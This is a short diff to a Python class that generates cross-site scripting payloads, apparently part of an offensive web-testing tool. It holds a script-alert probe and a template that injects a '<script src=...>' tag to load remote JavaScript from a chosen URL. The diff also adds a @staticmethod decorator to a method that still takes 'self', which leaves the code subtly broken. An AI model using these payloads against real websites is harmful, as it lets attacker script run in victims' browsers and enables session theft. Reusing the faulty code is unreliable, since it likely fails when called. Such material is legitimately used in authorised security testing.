@@ -15,11 +15,12 @@ class XSS(Payload):
         super(XSS, self).__init__()
         self.url = url
 
+    @staticmethod
     def alterTest(self, p=False):
         return "<script>alert(/xss/)</script>"
 
-    def script(self, p=False):
-        payload = "<script src='%s'></script>" % self.payload
+    def script(self):
+        payload = "<script src='%s'></script>" % self.url
         return payload
 
     def event(self, element, src, event, js):
